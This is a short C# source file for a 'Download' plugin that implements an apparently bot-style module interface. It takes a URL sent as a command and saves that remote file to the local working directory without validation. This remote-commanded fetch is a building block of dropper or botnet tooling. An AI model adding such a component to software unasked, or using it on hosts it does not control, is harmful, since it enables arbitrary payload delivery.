using System;
using System.IO;
using System.Net;
using Spindle;

namespace CoreModule.Modules {
    public class Download : IBotModule {
        public string Identifier => "DOWNLOAD";

        public string CommandReceived(string command) {
            if (String.IsNullOrEmpty(command)) return null;

            try {
                Uri uri = new Uri(command);
                using (var client = new WebClient()) {
                    Console.WriteLine("Downloading {0} to {1}", uri, Path.GetFileName(uri.LocalPath));
                    client.DownloadFile(uri, Path.GetFileName(uri.LocalPath));
                }
            } catch (UriFormatException) { }

            return null;
        }
    }
}
